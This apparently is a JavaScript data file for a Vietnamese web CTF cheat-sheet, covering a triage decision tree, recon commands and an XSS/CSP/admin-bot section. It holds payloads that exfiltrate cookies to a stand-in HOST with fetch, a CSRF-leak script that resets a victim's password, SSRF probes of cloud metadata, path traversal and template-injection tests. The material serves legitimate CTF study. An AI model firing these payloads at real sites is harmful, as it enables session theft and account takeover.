DATA.find(s => s.id === "web").items.push(
  {
    id: "web-decision",
    title: "Web decision tree",
    summary: "Đi theo thứ tự: recon → auth → injection → server-side → client-side. Mục tiêu là không bỏ sót bề mặt tấn công.",
    tags: ["triage", "methodology", "high"],
    priority: "high",
    tree: [
      {
        sign: "Chỉ có URL, không source",
        actions: [
          "Xem source, header, cookie, robots.txt, sitemap.xml",
          "ffuf/feroxbuster dir + vhost; đọc JS bundle + source map",
          "Check .git/, .env, backup, .well-known/",
          "Map endpoint/role/API; so sánh response giữa 2 account"
        ]
      },
      {
        sign: "Có source code",
        actions: [
          "grep sink: eval, exec, system, include, unserialize, pickle, render_template_string",
          "Đọc route/controller và luồng auth",
          "So sánh dependency/version với CVE đã biết",
          "Chạy local, thử input trước khi đánh remote"
        ]
      },
      {
        sign: "Login / auth / JWT",
        actions: [
          "SQLi/NoSQLi login bypass",
          "Decode JWT: alg none, weak secret, kid, jku/jwks",
          "Session cookie tamper; password reset; 2FA bypass",
          "Mass assignment: thêm role/is_admin vào body"
        ]
      },
      {
        sign: "Input được reflect",
        actions: [
          "Xác định context HTML / attribute / JS string / URL",
          "Test XSS cơ bản; đọc CSP",
          "Nếu có admin bot: leak CSRF token hoặc cookie",
          "Test DOM XSS: innerHTML, eval, location"
        ]
      },
      {
        sign: "Có upload file",
        actions: [
          "Test extension/MIME/magic bytes/polyglot",
          ".htaccess, .user.ini, .phar",
          "phar:// + deserialization",
          "Bypass disable_functions: FFI, LD_PRELOAD, imap_open"
        ]
      },
      {
        sign: "Tham số url= / image= / webhook= / fetch=",
        actions: [
          "Thử 127.0.0.1, localhost, [::1], 127.1, 2130706433",
          "Cloud metadata 169.254.169.254",
          "file://, gopher://, dict://",
          "Bypass bằng redirect, @, #, DNS rebinding"
        ]
      },
      {
        sign: "Tham số file= / page= / include= / template=",
        actions: [
          "Path traversal ../../etc/passwd",
          "PHP wrappers: php://filter, data://, zip://, phar://",
          "Log poisoning / session file / /proc/self/environ",
          "pearcmd, filter chain CVE-2024-2961"
        ]
      },
      {
        sign: "Input vào template engine",
        actions: [
          "Polyglot: {{7*7}} ${7*7} #{7*7} <%= 7*7 %>",
          "Nhận diện engine: Jinja2, Twig, Freemarker, Smarty",
          "Dùng payload RCE theo engine; thử sandbox bypass"
        ]
      },
      {
        sign: "Coin / gambling / coupon / ví",
        actions: [
          "Race condition: gửi request song song",
          "Double spend / redeem nhiều lần",
          "Số âm, overflow, round-down",
          "Bypass limit bằng nhiều account/request"
        ]
      }
    ],
    links: [
      { title: "PortSwigger Web Security Academy", url: "https://portswigger.net/web-security" },
      { title: "HackTricks", url: "https://book.hacktricks.wiki/" },
      { title: "PayloadsAllTheThings", url: "https://github.com/swisskyrepo/PayloadsAllTheThings" }
    ]
  },
  {
    id: "web-recon",
    title: "Recon & HTTP",
    summary: "Map endpoint, param, role và tech stack trước khi exploit. 80% thời gian web CTF nằm ở đây.",
    tags: ["recon", "http", "ffuf"],
    priority: "high",
    signals: [
      "Chỉ có URL, không source",
      "Có login/register/API và nhiều role",
      "JS bundle lớn, có source map",
      "Response header lạ hoặc version cũ"
    ],
    checklist: [
      "Xem source, robots.txt, sitemap.xml, response headers, cookie.",
      "Liệt kê endpoint từ JS bundle, source map, Swagger/GraphQL.",
      "ffuf/feroxbuster dir + vhost; arjun tìm param ẩn.",
      "Check .git/, .env, backup, .well-known/, file cấu hình.",
      "Xác định framework/version; tra CVE dependency.",
      "Đăng ký 2 account, so sánh quyền và response.",
      "Lưu request vào Burp Repeater; ghi chú endpoint lạ."
    ],
    commands: [
      {
        title: "Dir brute",
        code: C(
          "ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -mc all -fs 0",
          "feroxbuster -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt"
        )
      },
      {
        title: "Headers + git",
        code: C(
          "curl -i -s http://TARGET/ | head -40",
          "git-dumper http://TARGET/.git/ ./repo"
        )
      }
    ],
    gotchas: [
      "Thử cả raw IP và Host header khác nhau.",
      "403/401 vẫn có thể leak endpoint hoặc bypass bằng path encoding.",
      "Source map có thể chứa toàn bộ source code.",
      "Đừng bỏ qua OPTIONS, TRACE, methods lạ."
    ],
    links: [
      { title: "PortSwigger Academy", url: "https://portswigger.net/web-security" },
      { title: "HackTricks — Web methodology", url: "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/index.html" }
    ]
  },
  {
    id: "web-xss",
    title: "XSS + CSP + Admin bot",
    summary: "Reflect → execute → exfil token/cookie. Với TTV, dạng CSP injection + CSRF token leak + bot rất hay ra.",
    tags: ["xss", "csp", "csrf", "bot"],
    priority: "high",
    signals: [
      "Input được reflect vào HTML/attribute/JS",
      "Có report/contact admin bot",
      "Response có CSP header",
      "Comment, profile, search, todo-app"
    ],
    checklist: [
      "Xác định context: HTML, attribute, JS string, URL.",
      "Test <script>alert(1)<\/script>, \"><img src=x onerror=alert(1)>, javascript:.",
      "Đọc CSP: script-src, script-src-elem, nonce/hash, report-uri.",
      "Tìm param được nối vào CSP header; inject ;script-src-elem 'unsafe-inline';.",
      "Nếu có bot: fetch same-origin, đọc CSRF token, submit form.",
      "Exfil bằng fetch('//HOST/?'+btoa(document.cookie)) hoặc navigator.sendBeacon.",
      "Test DOM XSS: innerHTML, eval, location, postMessage."
    ],
    payloads: [
      {
        title: "Basic XSS",
        code: "<script>fetch('//HOST/?'+document.cookie)<\/script>"
      },
      {
        title: "IMG onerror",
        code: "<img src=x onerror=\"fetch('//HOST/?'+btoa(document.cookie))\">"
      },
      {
        title: "CSP injection + CSRF token leak (Feedbin style)",
        code: C(
          "x;script-src-elem 'unsafe-inline';",
          "<form id=f method=post action=/settings/change_password>",
          "<input id=t name=_t><input name=new_pw value=pwned><input name=new_pw_confirm value=pwned>",
          "</form>",
          "<script>",
          "async function x(){",
          "  const r=await fetch('/settings/change_password');",
          "  const h=await r.text();",
          '  const m=h.match(/name="_t" value="([^"]+)"/);',
          "  t.value=m[1]; f.submit();",
          "}",
          "x();",
          "<\/script>"
        )
      }
    ],
    commands: [
      { title: "Listener", code: "python3 -m http.server 8000" },
      { title: "Public tunnel", code: "cloudflared tunnel --url http://localhost:8000" }
    ],
    gotchas: [
      "Cookie HttpOnly thì không đọc được; mục tiêu thường là CSRF token trong HTML.",
      "script-src-elem có thể override script-src hoàn toàn.",
      "Bot có timeout ngắn; payload phải chạy nhanh, tránh vòng lặp.",
      "Bot có thể không ra Internet; ưu tiên fetch same-origin rồi đổi password/flag."
    ],
    links: [
      { title: "Feedbin writeup (kyrux29)", url: "https://github.com/kyrux29/CTF_WRITEUPS" },
      { title: "PortSwigger XSS", url: "https://portswigger.net/web-security/cross-site-scripting" }
    ]
  }
);
